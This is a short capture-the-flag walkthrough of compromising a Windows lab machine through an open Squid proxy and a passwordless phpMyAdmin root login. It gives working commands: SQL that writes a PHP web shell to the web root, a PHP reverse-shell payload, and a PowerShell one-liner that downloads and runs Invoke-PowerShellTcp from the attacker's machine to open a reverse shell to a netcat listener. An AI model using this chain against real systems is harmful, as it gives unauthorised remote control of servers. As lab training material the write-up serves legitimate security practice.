
nmap scan found squid proxy on port 3128

Connected to squid proxy and ran port scan on localhost

Found 8080

Went to 8080 and found phpinfo() and phpmyadmin

Logged into phpmyadmin with user:root, no password

In phpmyadmin created table tmp_tbl
```mysql
CREATE TABLE tmp_tbl (firstname varchar(255), lastname varchar(255));
```

Inserted php into column of tmp_tbl:
```php
<?php system($_GET["cmd"]); ?>
```

Checked web server location in PHPMyadmin, found at C:/wamp/www

Output the PHP by running the following command:
```mysql
SELECT firstname INTO OUTFILE 'C:/wamp/www/cmd.php' FROM tmp_tbl
```

Upon hitting `http://box-ip:8080/cmd.php?cmd=ipconfig` we found the script successfully ran and showed ipconfig output

Run nc listener locally

Tried running netcat through cmd.php but unsuccessful

UPDATE row in tmp_tbl to be the following:
```php
<?php set_time_limit(0); $ip = "<listening-ip>"; $port = listening-port; $sock = fsockopen($ip, $port); while(!feof($sock)) {$command = fgets($sock, 1024);$output = shell_exec($command);fwrite($sock, $output);} fclose($sock); ?>
```

Ran the INTO OUTFILE command again this time calling it shell.exe

Upon hitting this in a web request successfully gain a shell but "dumb" shell. Unable to escalate to powershell or cmd, however found a way on serverfault: https://serverfault.com/questions/588151/how-to-execute-a-reverse-powershell-shell-using-ncat-or-netcat

On local machine ran
```
python3 -m http.server 4444
```

In new tab ran
```
nc -lnvp 1338
```

Then, finally, in the "dumb" shell ran
```
powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<attacking-machine-port>:4444/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress <attacking-machine-port> -Port 1338"
```

And boom we have a reverse powershell connection 

From here just find the user flag, which was just a txt file located in C:\

Then ran 'whoami' and found out we were already system user so we looked in Administrator/Desktop and found the root flag